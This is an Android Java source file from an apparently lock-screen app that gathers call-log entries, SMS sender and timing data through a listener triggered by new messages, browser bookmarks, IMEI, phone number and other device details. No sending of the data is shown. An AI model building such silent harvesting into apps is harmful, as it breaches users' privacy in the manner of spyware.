package com.qin.zdlock;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.StatFs;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;

/**
 * Created by yang on 2/22/15.
 */
public class Basic_Information {

    public static String topActivity;
    private Uri SMS_INBOX = Uri.parse("content://sms/");



    //private Activity activity = null;

    private static Context context = null;

    private SmsObserver smsObserver;

    protected void initialize(Activity activity) {

        smsObserver = new SmsObserver(activity, smsHandler);
        activity.getContentResolver().registerContentObserver(SMS_INBOX, true, (ContentObserver) smsObserver);
        this.context = activity;

    }

    protected void initialize(Context context) {

        smsObserver = new SmsObserver(context, smsHandler);
        context.getContentResolver().registerContentObserver(SMS_INBOX, true, (ContentObserver) smsObserver);
        this.context = context;

    }

    public static String getTopActivity(){
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> tasksInfo = activityManager.getRunningTasks(1);
        if(tasksInfo.size() > 0){
            //System.out.println(tasksInfo.get(0).topActivity.getPackageName());
            topActivity = tasksInfo.get(0).topActivity.getPackageName();
        }
        return topActivity;
    }

    public String getPhoneCallInfo()
    {
        String strNumber="";
        String strName = "";
        int type;
        long callTime;
        Date date;
        String time= "";
        ContentResolver cr = context.getContentResolver();
        String collection = "";
        final Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        if(cursor.moveToNext()) {
            //cursor.moveToPosition(0);
            strNumber = cursor.getString(0);    //呼叫号码
            strName = cursor.getString(1);   //联系人姓名
            type = cursor.getInt(2);  //来电:1,拨出:2,未接:3 public static final int INCOMING_TYPE = 1;   public static final int OUTGOING_TYPE = 2;   public static final int MISSED_TYPE = 3;
            long duration = cursor.getLong(4);
            SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            date = new Date(Long.parseLong(cursor.getString(3)));
            time = sfd.format(date);

            collection += strNumber + "|" + type  + "|" + time + "|" + Long.toString(duration) + "\n";
        }
        return collection;
    }


    public String getSmsFromPhone() {
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[] { "body" };//"_id", "address", "person",, "date", "type
        //String where = " address = '1066321332' AND date >  " + (System.currentTimeMillis() - 10 * 60 * 1000);
        String where = "";
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        Log.v("new", "number of message: " + Long.toString(cur.getCount()));
        String collection = "";
        if (null == cur)
            return collection;
        for(;cur.moveToNext();) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号


            //String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表

            //String body = cur.getString(cur.getColumnIndex("body"));
            collection += number + "\n";
            //这里我是要获取自己短信服务号码中的验证码~~
            /*Pattern pattern = Pattern.compile(" [a-zA-Z0-9]{10}");
            Matcher matcher = pattern.matcher(body);
            if (matcher.find()) {
                String res = matcher.group().substring(1, 11);

                //mobileText.setText(res);
            }*/
        }
        return collection;
    }



    public String getSmsInPhone()
    {
        final String SMS_URI_ALL   = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND  = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";

        StringBuilder smsBuilder = new StringBuilder();

        try{
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");

            if (cur.moveToFirst()) {
                String name;
                String phoneNumber;
                String smsbody;
                String date;
                String type;

                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");

                if (cur.moveToNext())
                {
                    name = cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);

                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    date = dateFormat.format(d);

                    int typeId = cur.getInt(typeColumn);
                    if(typeId == 1){
                        type = "receive";
                    } else if(typeId == 2){
                        type = "send";
                    } else {
                        type = "";
                    }

                    //smsBuilder.append("[");
                    smsBuilder.append(name+"|");
                    smsBuilder.append(phoneNumber+"|");
                    //smsBuilder.append(smsbody+"|");
                    smsBuilder.append(date+"|");
                    smsBuilder.append(type+"\n");

                    if(smsbody == null) smsbody = "";

                    Log.v("new", smsBuilder.toString());

                }
            } else {
                smsBuilder.append("no result!");
            }

            //smsBuilder.append("getSmsInPhone has executed!");

        } catch(SQLiteException ex) {
            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
        }
        return smsBuilder.toString();
        //return "";
    }


    public Handler smsHandler = new Handler() {
        //这里可以进行回调的操作
        //TODO

    };
    class SmsObserver extends ContentObserver {

        public SmsObserver(Context context, Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            //每当有新短信到来时，使用我们获取短消息的方法
            getSmsInPhone();
        }
    }



        String records = null;
        StringBuilder recordBuilder = null;

        public String getInternetRecords() {
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    Uri.parse("content://browser/bookmarks"), new String[] {
                            "title", "url", "date" }, "",
                    new String[] { "null" }, "date desc");

            Log.v("new_count", Long.toString(cursor.getCount()));

            //get all internet records
/*            while (cursor != null && cursor.moveToNext()) {
                String url = null;
                String title = null;
                String time = null;
                String date = null;

                recordBuilder = new StringBuilder();
                title = cursor.getString(cursor.getColumnIndex("title"));
                url = cursor.getString(cursor.getColumnIndex("url"));

                date = cursor.getString(cursor.getColumnIndex("date"));

                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd hh:mm;ss");
                Date d = new Date(Long.parseLong(date));
                time = dateFormat.format(d);
                Log.v("new_internet", title + "|" + url + "|" + time + "\n");
                recordBuilder.append(title + "|" + url + "|" + time + "\n");
            }*/

            if (cursor != null && cursor.moveToNext()) {
                String url = null;
                String title = null;
                String time = null;
                String date = null;

                recordBuilder = new StringBuilder();
                title = cursor.getString(cursor.getColumnIndex("title"));
                url = cursor.getString(cursor.getColumnIndex("url"));

                date = cursor.getString(cursor.getColumnIndex("date"));

                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd hh:mm;ss");
                Date d = new Date(Long.parseLong(date));
                time = dateFormat.format(d);
                Log.v("new_internet", title + "|" + url + "|" + time + "\n");
                recordBuilder.append(title + "|" + url + "|" + time + "\n");
            }



            if (recordBuilder == null)
                return "";
            else {
                return recordBuilder.toString();
            }
        }

    public String getPhoneInformation()
    {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        String[] os_version = getVersion();
        String phone_number = tm.getLine1Number();

        String processor_info = getCpuName();
        String memory_info = Long.toString(getTotalInternalMemorySize());
        String ip_address = getIpAddress();
        return imei+ "|" + os_version[1]+"|"+phone_number+"|"+processor_info+"|"+memory_info+"|"+ip_address;
    }

    public String[] getVersion(){
        String[] version={"null","null","null","null"};
        String str1 = "/proc/version";
        String str2;
        String[] arrayOfString;
        try {
            FileReader localFileReader = new FileReader(str1);
            BufferedReader localBufferedReader = new BufferedReader(
                    localFileReader, 8192);
            str2 = localBufferedReader.readLine();
            arrayOfString = str2.split("\\s+");
            version[0]=arrayOfString[2];//KernelVersion
            localBufferedReader.close();
        } catch (IOException e) {
        }
        version[1] = Build.VERSION.RELEASE;// firmware version
        version[2]= Build.MODEL;//model
        version[3]= Build.DISPLAY;//system version
        return version;
    }

    private String getCpuName() {
        try {
            FileReader fr = new FileReader("/proc/cpuinfo");
            BufferedReader br = new BufferedReader(fr);
            String text = br.readLine();
            String[] array = text.split(":\\s+", 2);
            for (int i = 0; i < array.length; i++) {
            }
            return array[1];
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public long getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long totalBlocks = stat.getBlockCount();
        return totalBlocks * blockSize;
    }

    private String getIpAddress() {
        String ipAddress = null;
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface
                    .getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf
                        .getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        ipAddress = inetAddress.getHostAddress().toString();
                    }
                }
            }
        } catch (SocketException ex) {
            return null;
        }
        return ipAddress;
    }


}
